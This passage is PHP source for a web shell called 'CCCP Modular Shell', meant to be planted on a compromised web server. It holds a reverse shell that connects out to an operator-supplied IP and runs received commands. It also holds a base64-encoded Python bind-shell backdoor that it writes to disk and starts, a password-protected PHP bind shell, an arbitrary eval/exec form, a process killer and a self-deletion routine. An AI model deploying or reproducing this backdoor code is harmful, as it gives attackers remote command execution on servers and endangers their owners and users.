        17 => array('register_globals', getcfg('register_globals')),
        18 => array('magic_quotes_gpc', getcfg('magic_quotes_gpc')),
        19 => array('memory_limit', getcfg('memory_limit')),
        20 => array('post_max_size', getcfg('post_max_size')),
        21 => array('upload_max_filesize', $upsize),
        22 => array('max_execution_time', getcfg('max_execution_time') . ' second(s)'),
        23 => array('disable_functions', $dis_func),

        24 => array('MySQL', getfun('mysql_connect')),
        25 => array('MSSQL', getfun('mssql_connect')),
        26 => array('PostgreSQL', getfun('pg_connect')),
        27 => array('Oracle', getfun('ocilogon')),

        28 => array('Curl', getfun('curl_version')),
        29 => array('gzcompress', getfun('gzcompress')),
        30 => array('gzencode', getfun('gzencode')),
        31 => array('bzcompress', getfun('bzcompress')),
        );

    if (@simpleValidate($_POST['phpvarname'])) $content .= simpleDialog($_POST['phpvarname'] . ': ' . getcfg($_POST['phpvarname']));

    $content .= '<form name="form1" action="" method="post" > 
        <h2>Variables del servidor</h2> 
        <p>Ingrese los parametros PHP de configuracion (ej: magic_quotes_gpc)
        <input class="input" name="phpvarname" id="phpvarname" value="" type="text" size="100" /></p> 
        <p><input class="bt" name="submit" id="submit" type="submit" value="Submit"></p> 
        </form>';

    $hp = array(0 => 'Server', 1 => 'PHP', 2 => 'Extras');
    for ($a = 0; $a < 3; $a++) {
        $content .= '<h2>' . $hp[$a] . '</h2><ul>';
        if ($a == 0) {
            for ($i = 1; $i <= 9; $i++) {
                $content .= '<li><b>' . $info[$i][0] . ':</b> ' . $info[$i][1] . '</li>';
            }
        } elseif ($a == 1) {
            for ($i = 10; $i <= 23; $i++) {
                $content .= '<li><b>' . $info[$i][0] . ':</b> ' . $info[$i][1] . '</li>';
            }
        } elseif ($a == 2) {
            for ($i = 24; $i <= 31; $i++) {
                $content .= '<li><b>' . $info[$i][0] . ':</b> ' . $info[$i][1] . '</li>';
            }
        }

        $content .= '</ul>';
    }
}


if (@$_POST[$config['Menu']] === 'phpinfo') {
    if (function_exists('phpinfo') and @! in_array('phpinfo', $dis_func)) {
        phpinfo();
        exit;
    } else {
        $content = simpleDialog('phpinfo() function has non-permissible');
    }
}


if (@$_POST[$config['Menu']] === 'srm') {
    if ((isset($_POST['submit'])) and ($_POST['submit'] === $_POST['rndcode'])) {
        if (unlink(__file__)) {
            @ob_clean();
            exit('Bye ;(');
        } else {
            $content .= '<center><b>Can\'t delete ' . __file__ . '!</b></center>';
        }
    } else {
        $rnd = rand(0, 9) . rand(0, 9) . rand(0, 9);
        $content .= '<form action="" method="post">
			<b>Self-remove: ' . __file__ . '<br><b>' . $lang['merror'] . '<br>For confirmation enter this code: ' . $rnd . '</b> 
			<input type="hidden" name="rndcode" value="' . $rnd . '"><input type="text" name="submit"> <input type="submit" value="YES">
			<input type="hidden" name="' . $config['Menu'] . '" value="srm">
			</form>';
    }
}

if (@$_POST[$config['Menu']] === 'connect') { //Basada en AniShell
    if (@simpleValidate($_POST['ip']) && simpleValidate($_POST['port'])) {
        $content .= '<p>The Program is now trying to connect!</p>';
        $ip = $_POST['ip'];
        $port = $_POST['port'];
        $sockfd = fsockopen($ip, $port, $errno, $errstr);
        if ($errno != 0) {
            $content .= '<font color="red"><b>' . $errno . '</b>: ' . $errstr . '</font>';
        } else
            if (! $sockfd) {
                $result = '<p>Fatal: An unexpected error was occured when trying to connect!</p>';
            } else {
                $len = 1500;
                fputs($sockfd, execute('uname -a') . "\n"); //sysinfo
                fputs($sockfd, execute('pwd') . "\n");
                fputs($sockfd, execute('id') . "\n\n");
                fputs($sockfd, execute('time /t & date /T') . "\n\n"); //dateAndTime

                while (! feof($sockfd)) {
                    fputs($sockfd, '(Shell)[$]> ');
                    $command = fgets($sockfd, $len);
                    fputs($sockfd, "\n" . execute($command) . "\n\n");
                }
                fclose($sockfd);
            }
    } else
        if (@(simpleValidate($_POST['port'])) && (simpleValidate($_POST['passwd'])) && (simpleValidate($_POST['mode']))) {
            $address = '127.0.0.1';
            $port = $_POST['port'];
            $pass = $_POST['passwd'];

            if ($_POST['mode'] === 'Python') {
                $Python_CODE = "IyBTZXJ2ZXIgIA0KIA0KaW1wb3J0IHN5cyAgDQppbXBvcnQgc29ja2V0ICANCmltcG9ydCBvcyAgDQoNCmhvc3QgPSAnJzsgIA0KU0laRSA9IDUxMjsgIA0KDQp0cnkgOiAgDQogICAgIHBvcnQgPSBzeXMuYXJndlsxXTsgIA0KDQpleGNlcHQgOiAgDQogICAgIHBvcnQgPSAzMTMzNzsgIA0KIA0KdHJ5IDogIA0KICAgICBzb2NrZmQgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVUICwgc29ja2V0LlNPQ0tfU1RSRUFNKTsgIA0KDQpleGNlcHQgc29ja2V0LmVycm9yICwgZSA6ICANCg0KICAgICBwcmludCAiRXJyb3IgaW4gY3JlYXRpbmcgc29ja2V0IDogIixlIDsgIA0KICAgICBzeXMuZXhpdCgxKTsgICANCg0Kc29ja2ZkLnNldHNvY2tvcHQoc29ja2V0LlNPTF9TT0NLRVQgLCBzb2NrZXQuU09fUkVVU0VBRERSICwgMSk7ICANCg0KdHJ5IDogIA0KICAgICBzb2NrZmQuYmluZCgoaG9zdCxwb3J0KSk7ICANCg0KZXhjZXB0IHNvY2tldC5lcnJvciAsIGUgOiAgICAgICAgDQogICAgIHByaW50ICJFcnJvciBpbiBCaW5kaW5nIDogIixlOyANCiAgICAgc3lzLmV4aXQoMSk7ICANCiANCnByaW50KCJcblxuPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09Iik7IA0KcHJpbnQoIi0tLS0tLS0tIFNlcnZlciBMaXN0ZW5pbmcgb24gUG9ydCAlZCAtLS0tLS0tLS0tLS0tLSIgJSBwb3J0KTsgIA0KcHJpbnQoIj09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PVxuXG4iKTsgDQogDQp0cnkgOiAgDQogICAgIHdoaWxlIDEgOiAjIGxpc3RlbiBmb3IgY29ubmVjdGlvbnMgIA0KICAgICAgICAgc29ja2ZkLmxpc3RlbigxKTsgIA0KICAgICAgICAgY2xpZW50c29jayAsIGNsaWVudGFkZHIgPSBzb2NrZmQuYWNjZXB0KCk7ICANCiAgICAgICAgIHByaW50KCJcblxuR290IENvbm5lY3Rpb24gZnJvbSAiICsgc3RyKGNsaWVudGFkZHIpKTsgIA0KICAgICAgICAgd2hpbGUgMSA6ICANCiAgICAgICAgICAgICB0cnkgOiAgDQogICAgICAgICAgICAgICAgIGNtZCA9IGNsaWVudHNvY2sucmVjdihTSVpFKTsgIA0KICAgICAgICAgICAgIGV4Y2VwdCA6ICANCiAgICAgICAgICAgICAgICAgYnJlYWs7ICANCiAgICAgICAgICAgICBwaXBlID0gb3MucG9wZW4oY21kKTsgIA0KICAgICAgICAgICAgIHJhd091dHB1dCA9IHBpcGUucmVhZGxpbmVzKCk7ICANCiANCiAgICAgICAgICAgICBwcmludChjbWQpOyAgDQogICAgICAgICAgIA0KICAgICAgICAgICAgIGlmIGNtZCA9PSAnZzJnJzogIyBjbG9zZSB0aGUgY29ubmVjdGlvbiBhbmQgbW92ZSBvbiBmb3Igb3RoZXJzICANCiAgICAgICAgICAgICAgICAgcHJpbnQoIlxuLS0tLS0tLS0tLS1Db25uZWN0aW9uIENsb3NlZC0tLS0tLS0tLS0tLS0tLS0iKTsgIA0KICAgICAgICAgICAgICAgICBjbGllbnRzb2NrLnNodXRkb3duKCk7ICANCiAgICAgICAgICAgICAgICAgYnJlYWs7ICANCiAgICAgICAgICAgICB0cnkgOiAgDQogICAgICAgICAgICAgICAgIG91dHB1dCA9ICIiOyAgDQogICAgICAgICAgICAgICAgICMgUGFyc2UgdGhlIG91dHB1dCBmcm9tIGxpc3QgdG8gc3RyaW5nICANCiAgICAgICAgICAgICAgICAgZm9yIGRhdGEgaW4gcmF3T3V0cHV0IDogIA0KICAgICAgICAgICAgICAgICAgICAgIG91dHB1dCA9IG91dHB1dCtkYXRhOyAgDQogICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgIGNsaWVudHNvY2suc2VuZCgiQ29tbWFuZCBPdXRwdXQgOi0gXG4iK291dHB1dCsiXHJcbiIpOyAgDQogICAgICAgICAgICAgICANCiAgICAgICAgICAgICBleGNlcHQgc29ja2V0LmVycm9yICwgZSA6ICANCiAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgcHJpbnQoIlxuLS0tLS0tLS0tLS1Db25uZWN0aW9uIENsb3NlZC0tLS0tLS0tIik7ICANCiAgICAgICAgICAgICAgICAgY2xpZW50c29jay5jbG9zZSgpOyAgDQogICAgICAgICAgICAgICAgIGJyZWFrOyAgDQpleGNlcHQgIEtleWJvYXJkSW50ZXJydXB0IDogIA0KIA0KDQogICAgIHByaW50KCJcblxuPj4+PiBTZXJ2ZXIgVGVybWluYXRlZCA8PDw8PFxuIik7ICANCiAgICAgcHJpbnQoIj09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09Iik7IA0KICAgICBwcmludCgiXHRUaGFua3MgZm9yIHVzaW5nIEFuaS1zaGVsbCdzIC0tIFNpbXBsZSAtLS0gQ01EIik7ICANCiAgICAgcHJpbnQoIlx0RW1haWwgOiBsaW9uYW5lZXNoQGdtYWlsLmNvbSIpOyAgDQogICAgIHByaW50KCI9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0iKTsNCg==";

                $bindname = 'bind.py'; //TODO EL NOMBRE TENDRIA QUE SER ALEATORIO
                $fd = fopen($bindname, 'w');
                if ($fd) {
                    fwrite($fd, base64_decode($Python_CODE));

                    if ($isWIN) {
                        $content .= '[+] OS Detected = Windows';
                        execute('start bind.py');

                        $pattern = 'python.exe';
                        $list = execute('TASKLIST');
                    } else {
                        $content .= '[+] OS Detected = Linux';
                        execute('chmod +x bind.py ; ./bind.py');

                        // Check if the process is running
                        $pattern = $bindname;
                        $list = execute('ps -aux');
                    }


                    if (preg_match("/$pattern/", $list)) {
                        $content .= '<p class="alert_green">Process Found Running! Backdoor Setuped Successfully</p>';
                    } else {
                        $content .= '<p class="alert_red">Process Not Found Running! Backdoor Setup FAILED</p>';
                    }

                    $content .= "<br/><br/>\n<b>Task List :-</b> <pre>\n$list</pre>";

                }
            }
        } else
            if (@$_POST['mode'] === 'PHP') {
                // Set the ip and port we will listen on
                if (function_exists("socket_create")) {
                    // Create a TCP Stream socket
                    $sockfd = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);

                    // Bind the socket to an address/port
                    if (socket_bind($sockfd, $address, $port) == false) {
                        $content .= "Cant Bind to the specified port and address!";
                    }

                    // Start listening for connections
                    socket_listen($sockfd, 17);

                    /* Accept incoming requests and handle them as child processes */
                    $client = socket_accept($sockfd);
                    socket_write($client, 'Password: ');
                    // Read the pass from the client
                    $input = socket_read($client, strlen($pass) + 2); // +2 for \r\n
                    if (trim($input) == $pass) {
                        socket_write($client, "\n\n");
                        socket_write($client, ($isWIN) ? execute("date /t & time /t") . "\n" . execute("ver") : execute("date") . "\n" . execute("uname -a"));
                        socket_write($client, "\n\n");
                        while (1) {
                            // Print Command prompt
                            $maxCmdLen = 31337;
                            socket_write($client, '(Shell)[$]> ');
                            $cmd = socket_read($client, $maxCmdLen);
                            if ($cmd == false) {
                                $content .= 'The client Closed the conection!';
                                break;
                            }
                            socket_write($client, execute($cmd));
                        }
                    } else {
                        $content .= 'Wrong Password!';
                        socket_write($client, "Wrong Password!\n\n");
                    }
                    socket_shutdown($client, 2);
                    socket_close($socket);

                    // Close the client (child) socket
                    //socket_close($client);
                    // Close the master sockets
                    //socket_close($sock);
                } else {
                    $content .= "Socket Conections not Allowed/Supported by the server!";
                }
            } else {
                $content .= '
      <table class="bind" align="center" >
      <tr>
         <th class="header" colspan="1" width="50px">Back Connect</th>
         <th class="header" colspan="1" width="50px">Bind Shell</th>
      </tr>
      <tr>
         <form method="POST">  
          <td>
            <table style="border-spacing: 6px;">
               <tr>
                  <td>IP </td>
                  <td>
                     <input style="width: 200px;" class="cmd" name="ip" value="' . $_SERVER['REMOTE_ADDR'] . '" />
                  </td>
               </tr>
               <tr>
                  <td>Port </td>
                  <td><input style="width: 100px;" class="cmd" name="port" size="5" value="31337"/></td>
               </tr>
               <tr>
               <td>Mode </td>    
               <td>
                     <select name="mode" class="cmd">
                        <option value="PHP">PHP</option>
                     </select>  <input style="width: 90px;" class="own" type="submit" value="Connect!"/></td>
               
            </table>
          </td>
          </form> 
          <form method="POST">
          <td>
            <table style="border-spacing: 6px;">
               <tr>
                  <td>Port</td>
                  <td>
                     <input style="width: 200px;" class="cmd" name="port" value="31337" />
                  </td>
               </tr>
               <tr>
                  <td>Password </td>
                  <td><input style="width: 100px;" class="cmd" name="passwd" size="5" value="indetectables"/>
               </tr>
               <tr>
               <td>
               Mode
               </td>
               <td>
                     <select name="mode" class="cmd">
                        <option value="PHP">PHP</option>
                        <option value="Python">Python</option>
                     </select><input style="width: 90px;" class="own" type="submit" value="Bind :D!"/></td>
               </tr>    
                  
            </table>
          </td>
          </form>
      </tr>
      </table>
      <p align="center" style="color: red;" >Note : After clicking Submit button , The browser will start loading continuously , Dont close this window , Unless you are done!</p>
      ';
            }
}


if (@$_POST[$config['Menu']] === 'procs') {
	if (isset($_POST['ps'])) {
        for ($i = 0; count($_POST['ps']) > $i; $i++) {
			if (function_exists('posix_kill')) $content .= simpleDialog((posix_kill($_POST['ps'][$i], '9') ? 'Process with pid ' . $_POST['ps'][$i] . ' has been successfully killed' : 'Unable to kill process with pid ' . $_POST['ps'][$i]));
			else {
				if($isWIN) $content .= simpleDialog(execute('taskkill /F /PID ' . $_POST['ps'][$i]));
				else $content .= simpleDialog(execute('kill -9 ' . $_POST['ps'][$i]));
			}
		}
	}

	$h = 'ps aux';
	$wexplode = ' ';
	if ($isWIN) {
		$h = 'tasklist /V /FO csv';
		$wexplode = '","';
	}

	$res = execute($h);
	if(trim($res) === '') $content = simpleDialog('Error getting process list');
	else {
		if(!$isWIN) $res = preg_replace('#\ +#', ' ', $res);
		$psarr = explode("\n", $res);
		$fi = true;
		$tblcount = 0;
		$wcount = count( explode($wexplode, $psarr[0]) );

		$content .= '<br><form method="post" action="" name="ps"><table class="explore sortable">';
		foreach($psarr as $psa){
			if(trim($psa) !== ''){
				if($fi){
					$fi = false;
					$psln = explode($wexplode, $psa, $wcount);
					$content .= '<tr><th style="width:24px;" class="sorttable_nosort"></th><th class="sorttable_nosort">action</th>';
					foreach($psln as $p) $content .= '<th>' . trim(trim($p), '"') . '</th>';
					$content .= '</tr>';
				} else {
					$psln = explode($wexplode, $psa, $wcount);
					$content .= '<tr>';
					$tblcount = 0;
					foreach($psln as $p){
						$pid = trim(trim($psln[1]), '"');
						if(trim($p) === '') $p = '&nbsp;';
						if($tblcount == 0){
							$content .= '<td style="text-align:center;text-indent:4px;"><input id="ps" name="ps[]" value="' . $pid . '" type="checkbox" onchange="hilite(this);" /></td><td style="text-align:center;"><a href="#" onclick="if (confirm(\'' . $lang['merror'] . '\')) go(\'' . $config['Menu'] . '=procs&ps[]=' . $pid . '\')">kill</a></td>
									<td style="text-align:center;">' . trim(trim($p), '"') . '</td>';
							$tblcount++;
						} else {
							$tblcount++;
							if($tblcount == count($psln)) $content .= "<td style='text-align:left;'>".trim(trim($p), '"')."</td>";
							else $content .= "<td style='text-align:center;'>".trim(trim($p), '"')."</td>";
						}
					}
					$content .= '</tr>';
				}
			}
		}
		
		$content .= '<tfoot><tr><td>
		<input type="checkbox" onclick="CheckAll(this.form)" value="1" name="abox" />
		</td><td style="text-indent:10px;padding:2px;" colspan="' . (count($psln)+1) . '"><input class="bt" name="submit" id="submit" type="submit" value="kill selected">
		<input type="hidden" name="' . $config['Menu'] . '" value="procs" /> <span id="total_selected"></span></a></td>
		</tr></tfoot></table></form>';
	}
}

if (@$_POST[$config['Menu']] === 'eval') {
    $content .= '<h2>Eval/Execute &raquo;</h2>';
    $code = @trim($_POST['code']);
    if ($code) {
		if (isset($_POST['exec'])) {
			/*$locale = 'en_GB.utf-8';
			setlocale(LC_ALL, $locale);
			putenv('LC_ALL='.$locale);*/
			$buffer = htmlspecialchars( execute($code) );
			if (isset($_POST['textarea'])) $content .= '<br><textarea class="bigarea" readonly>' . htmlspecialchars($buffer) . '</textarea>';
			else $content .= $buffer . '<br><pre></pre>';
		} else {
			if (! preg_match('#<\?#si', $code)) $code = "<?php\n\n{$code}\n\n?>";

			//hago esta chapuzada para que no se muestre el resultado arriba
			echo 'Result of the executed code:';
			$buffer = ob_get_contents();

			if ($buffer) {
				ob_clean();
				eval("?" . ">$code");
				$ret = ob_get_contents();
				$ret = convert_cyr_string($ret, 'd', 'w');
				ob_clean();
				$content .= $buffer;
				if (isset($_POST['textarea'])) $content .= '<br><textarea class="bigarea" readonly>' . htmlspecialchars($ret) . '</textarea>';
				else $content .= $ret . '<br><pre></pre>';
			} else {
				eval("?" . ">$code");
			}
        }
    }

    $content .= '<form name="form" action="" method="post" >
	<p><br>PHP Code:<br>
	<textarea class="bigarea" name="code">' . @htmlspecialchars($_POST['code']) . '</textarea></p>
	<p>Display in text-area:&nbsp;<input type="checkbox" name="textarea" value="1" ' . (isset($_POST['textarea']) ? 'checked' : '') . '>&nbsp;&nbsp;
	Execute:&nbsp;<input type="checkbox" name="exec" value="1" ' . (isset($_POST['exec']) ? 'checked' : '') . '>&nbsp;&nbsp;
	<a href="http://www.4ngel.net/phpspy/plugin/" target="_blank">[ Get examples ]</a>
	<br><br><input class="bt" name="submit" id="submit" type="submit" value="Submit"></p>
	<input type="hidden" name="' . $config['Menu'] . '" value="eval" />
	</form>';
}


# Imprimo plantilla
echo '<!DOCTYPE html>
<html>
<head>
  <meta http-equiv=content-Type content="text/html; charset=iso-8859-1">
  <meta http-equiv=Pragma content=no-cache>
  <meta http-equiv=Expires content="wed, 26 Feb 1997 08:21:57 GMT">
  <meta name="robots" content="noindex, nofollow, noarchive" />
  <link rel="shortcut icon" href="data:image/x-icon;base64,AAABAAEAEBAAAAEAIABoBAAAFgAAACgAAAAQAAAAIAAAAAEAIAAAAAAAQAQAAAAAAAAAAAAAAAAAAAAAAAAAAAD+AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD+AAAA+AIGAv8IHAn/CSIL/wkiC/8JIgv/CSIL/wkiC/8JIgv/CSIL/wkiC/8JIgv/CSIL/wkhC/8FEQb/AAEA9wABAPsHGgj/IHUm/yeOLv8njS7/J40u/yeOLv8nji7/J40u/yaMLf8njS7/J44u/yeNLv8miy3/FEYX/wEDAfsAAQD7CB4K/yWGK/8sojX/LKE0/y2iNf8rnDL/I4Iq/x1nIv8aXh7/HWki/yWEKv8rnTP/LJ80/xZQGv8BAwH7AAEA+wgeCv8lhSv/LKE1/yyhNP8okS//FlAa/wccCf8DCgP/AQUC/wMLA/8IHgn/F1Uc/yiRMP8WUBr/AQMB+wABAPsIHgr/JYUr/yyhNf8pljH/FEkX/wMLA/8AAAb/AAAV/wAAC/8AAAD/AAAA/wQQBf8bYyD/FlAa/wEDAfsAAQD7CB4K/yWFK/8sojT/HWki/wQQBf8AAAb/AABS/wAAnv8AAGT/AAAN/wAAAP8DDAT/Gl4e/xZQGv8BAwH7AAEA+wgeCv8lhiz/KZcx/w84Ev8BAgH/AAAk/wAAu/8AAOL/AAB2/wAADf8DCQP/E0UW/yeOLv8WUBr/AQMB+wABAPsIHgr/JYcs/ySFK/8IHgr/AAAA/wAALf8AAI3/AABe/wABFP8FEAb/FUwY/yiSL/8rnjP/FlAa/wEDAfsAAQD7CB4K/yWGK/8fdCX/BA8E/wAAAP8AAAf/AAAQ/wEFBv8JIgv/G2Qh/yqXMf8soTT/K50z/xZQGv8BAwH7AAEA+wgeCv8lhSv/HGci/wIIA/8AAQD/AgYC/wcZCf8USRj/I4Iq/yueM/8soTT/LKA0/yudM/8WUBr/AQMB+wABAPsIHgr/JYQr/xxnIf8GGAj/CycN/xVLGP8ieyj/Kpoy/yygNP8soDT/LKA0/yygNP8rnTP/FlAa/wEDAfsAAQD7CB4K/yWFK/8miy7/IHcm/yeNLf8snTP/LaI1/yyhNP8soDT/LKA0/yygNP8soDT/K50z/xZQGv8BAwH7AAEA+wYZCP8ebSP/JIQr/ySEK/8khCv/JIQr/ySDK/8kgyv/JIMr/ySDK/8kgyv/JIMr/yOBKv8SQhX/AQMB+wABAPsBBAH/BRIG/wYWB/8GFgf/BhYH/wYWB/8GFgf/BhYH/wYWB/8GFgf/BhYH/wYWB/8GFQf/AwsE/wABAPsAAAD+AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD+AAAmAAAAJgAAACYAAAAmAAAAJgAAACYAAAAmAAAAJgAAACYAAAAmAAAAJgAAACYAAAAmAAAAJgAAACYAAAAmAA==" />
  <title>CCCP Modular Shell</title>  
  <script type="text/javascript">
	var h=!0,j=!1;
	sorttable={e:function(){arguments.callee.i||(arguments.callee.i=h,k&&clearInterval(k),document.createElement&&document.getElementsByTagName&&(sorttable.a=/^(\d\d?)[\/\.-](\d\d?)[\/\.-]((\d\d)?\d\d)$/,l(document.getElementsByTagName("table"),function(a){-1!=a.className.search(/\bsortable\b/)&&sorttable.k(a)})))},k:function(a){0==a.getElementsByTagName("thead").length&&(the=document.createElement("thead"),the.appendChild(a.rows[0]),a.insertBefore(the,a.firstChild));null==a.tHead&&(a.tHead=a.getElementsByTagName("thead")[0]);
	if(1==a.tHead.rows.length){sortbottomrows=[];for(var b=0;b<a.rows.length;b++)-1!=a.rows[b].className.search(/\bsortbottom\b/)&&(sortbottomrows[sortbottomrows.length]=a.rows[b]);if(sortbottomrows){null==a.tFoot&&(tfo=document.createElement("tfoot"),a.appendChild(tfo));for(b=0;b<sortbottomrows.length;b++)tfo.appendChild(sortbottomrows[b]);delete sortbottomrows}headrow=a.tHead.rows[0].cells;for(b=0;b<headrow.length;b++)if(!headrow[b].className.match(/\bsorttable_nosort\b/)){(mtch=headrow[b].className.match(/\bsorttable_([a-z0-9]+)\b/))&&
	(override=mtch[1]);headrow[b].p=mtch&&"function"==typeof sorttable["sort_"+override]?sorttable["sort_"+override]:sorttable.j(a,b);headrow[b].o=b;headrow[b].c=a.tBodies[0];var c=headrow[b],e=sorttable.q=function(){if(-1!=this.className.search(/\bsorttable_sorted\b/))sorttable.reverse(this.c),this.className=this.className.replace("sorttable_sorted","sorttable_sorted_reverse"),this.removeChild(document.getElementById("sorttable_sortfwdind")),sortrevind=document.createElement("span"),sortrevind.id="sorttable_sortrevind",
	sortrevind.innerHTML="&nbsp;&#x25B4;",this.appendChild(sortrevind);else if(-1!=this.className.search(/\bsorttable_sorted_reverse\b/))sorttable.reverse(this.c),this.className=this.className.replace("sorttable_sorted_reverse","sorttable_sorted"),this.removeChild(document.getElementById("sorttable_sortrevind")),sortfwdind=document.createElement("span"),sortfwdind.id="sorttable_sortfwdind",sortfwdind.innerHTML="&nbsp;&#x25BE;",this.appendChild(sortfwdind);else{theadrow=this.parentNode;l(theadrow.childNodes,
	function(a){1==a.nodeType&&(a.className=a.className.replace("sorttable_sorted_reverse",""),a.className=a.className.replace("sorttable_sorted",""))});(sortfwdind=document.getElementById("sorttable_sortfwdind"))&&sortfwdind.parentNode.removeChild(sortfwdind);(sortrevind=document.getElementById("sorttable_sortrevind"))&&sortrevind.parentNode.removeChild(sortrevind);this.className+=" sorttable_sorted";sortfwdind=document.createElement("span");sortfwdind.id="sorttable_sortfwdind";sortfwdind.innerHTML=
	"&nbsp;&#x25BE;";this.appendChild(sortfwdind);row_array=[];col=this.o;rows=this.c.rows;for(var a=0;a<rows.length;a++)row_array[row_array.length]=[sorttable.d(rows[a].cells[col]),rows[a]];row_array.sort(this.p);tb=this.c;for(a=0;a<row_array.length;a++)tb.appendChild(row_array[a][1]);delete row_array}};if(c.addEventListener)c.addEventListener("click",e,j);else{e.f||(e.f=n++);c.b||(c.b={});var g=c.b.click;g||(g=c.b.click={},c.onclick&&(g[0]=c.onclick));g[e.f]=e;c.onclick=p}}}},j:function(a,b){sortfn=
	sorttable.l;for(var c=0;c<a.tBodies[0].rows.length;c++)if(text=sorttable.d(a.tBodies[0].rows[c].cells[b]),""!=text){if(text.match(/^-?[\u00a3$\u00a4]?[\d,.]+%?$/))return sorttable.n;if(possdate=text.match(sorttable.a)){first=parseInt(possdate[1]);second=parseInt(possdate[2]);if(12<first)return sorttable.g;if(12<second)return sorttable.m;sortfn=sorttable.g}}return sortfn},d:function(a){if(!a)return"";hasInputs="function"==typeof a.getElementsByTagName&&a.getElementsByTagName("input").length;if(""!=
	a.title)return a.title;if("undefined"!=typeof a.textContent&&!hasInputs)return a.textContent.replace(/^\s+|\s+$/g,"");if("undefined"!=typeof a.innerText&&!hasInputs)return a.innerText.replace(/^\s+|\s+$/g,"");if("undefined"!=typeof a.text&&!hasInputs)return a.text.replace(/^\s+|\s+$/g,"");switch(a.nodeType){case 3:if("input"==a.nodeName.toLowerCase())return a.value.replace(/^\s+|\s+$/g,"");case 4:return a.nodeValue.replace(/^\s+|\s+$/g,"");case 1:case 11:for(var b="",c=0;c<a.childNodes.length;c++)b+=
	sorttable.d(a.childNodes[c]);return b.replace(/^\s+|\s+$/g,"");default:return""}},reverse:function(a){newrows=[];for(var b=0;b<a.rows.length;b++)newrows[newrows.length]=a.rows[b];for(b=newrows.length-1;0<=b;b--)a.appendChild(newrows[b]);delete newrows},n:function(a,b){aa=parseFloat(a[0].replace(/[^0-9.-]/g,""));isNaN(aa)&&(aa=0);bb=parseFloat(b[0].replace(/[^0-9.-]/g,""));isNaN(bb)&&(bb=0);return aa-bb},l:function(a,b){return a[0].toLowerCase()==b[0].toLowerCase()?0:a[0].toLowerCase()<b[0].toLowerCase()?
	-1:1},g:function(a,b){mtch=a[0].match(sorttable.a);y=mtch[3];m=mtch[2];d=mtch[1];1==m.length&&(m="0"+m);1==d.length&&(d="0"+d);dt1=y+m+d;mtch=b[0].match(sorttable.a);y=mtch[3];m=mtch[2];d=mtch[1];1==m.length&&(m="0"+m);1==d.length&&(d="0"+d);dt2=y+m+d;return dt1==dt2?0:dt1<dt2?-1:1},m:function(a,b){mtch=a[0].match(sorttable.a);y=mtch[3];d=mtch[2];m=mtch[1];1==m.length&&(m="0"+m);1==d.length&&(d="0"+d);dt1=y+m+d;mtch=b[0].match(sorttable.a);y=mtch[3];d=mtch[2];m=mtch[1];1==m.length&&(m="0"+m);1==d.length&&
	(d="0"+d);dt2=y+m+d;return dt1==dt2?0:dt1<dt2?-1:1},r:function(a,b){for(var c=0,e=a.length-1,g=h;g;){for(var g=j,f=c;f<e;++f)0<b(a[f],a[f+1])&&(g=a[f],a[f]=a[f+1],a[f+1]=g,g=h);e--;if(!g)break;for(f=e;f>c;--f)0>b(a[f],a[f-1])&&(g=a[f],a[f]=a[f-1],a[f-1]=g,g=h);c++}}};document.addEventListener&&document.addEventListener("DOMContentLoaded",sorttable.e,j);if(/WebKit/i.test(navigator.userAgent))var k=setInterval(function(){/loaded|complete/.test(document.readyState)&&sorttable.e()},10);
	window.onload=sorttable.e;var n=1;function p(a){var b=h;a||(a=((this.ownerDocument||this.document||this).parentWindow||window).event,a.preventDefault=q,a.stopPropagation=r);var c=this.b[a.type],e;for(e in c)this.h=c[e],this.h(a)===j&&(b=j);return b}function q(){this.returnValue=j}function r(){this.cancelBubble=h}Array.forEach||(Array.forEach=function(a,b,c){for(var e=0;e<a.length;e++)b.call(c,a[e],e,a)});
	Function.prototype.forEach=function(a,b,c){for(var e in a)"undefined"==typeof this.prototype[e]&&b.call(c,a[e],e,a)};String.forEach=function(a,b,c){Array.forEach(a.split(""),function(e,g){b.call(c,e,g,a)})};function l(a,b){if(a){var c=Object;if(a instanceof Function)c=Function;else{if(a.forEach instanceof Function){a.forEach(b,void 0);return}"string"==typeof a?c=String:"number"==typeof a.length&&(c=Array)}c.forEach(a,b,void 0)}};!function(e,t){typeof module!="undefined"?module.exports=t():typeof define=="function"&&typeof define.amd=="object"?define(t):this[e]=t()}("domready",function(e){function p(e){h=1;while(e=t.shift())e()}var t=[],n,r=!1,i=document,s=i.documentElement,o=s.doScroll,u="DOMContentLoaded",a="addEventListener",f="onreadystatechange",l="readyState",c=o?/^loaded|^c/:/^loaded|c/,h=c.test(i[l]);return i[a]&&i[a](u,n=function(){i.removeEventListener(u,n,r),p()},r),o&&i.attachEvent(f,n=function(){/^c/.test(i[l])&&(i.detachEvent(f,n),p())}),e=o?function(n){self!=top?h?n():t.push(n):function(){try{s.doScroll("left")}catch(t){return setTimeout(function(){e(n)},50)}n()}()}:function(e){h?e():t.push(e)}})

    function CheckAll(form) {
        for(i = 0; i < form.elements.length; i++) {
            var e = form.elements[i];
            if (e.name != "chkall") e.checked = form.chkall.checked;
		}
    }
	
	function toggle(b){
		if(document.getElementById(b)){
			if(document.getElementById(b).style.display == "block") document.getElementById(b).style.display = "none";
			else document.getElementById(b).style.display = "block"
		}
	}
	
	function go(u){
		arr = u.split("&");
		
		temp = "";
		for (i = 0; i <= arr.length - 1; i++) {
			e = arr[i].indexOf("=");
			temp += "<input type=\'hidden\' name=\'" + arr[i].slice(0,e) + "\' value=\'" + arr[i].slice(e+1) + "\' />";
		}
		
		document.dummy.innerHTML = temp;
		document.dummy.submit();
		return false;
	}
	
	function hilite(e){
		var c = e.parentElement.parentElement;
		if(e.checked) c.className = "mark";
		else c.className = "";

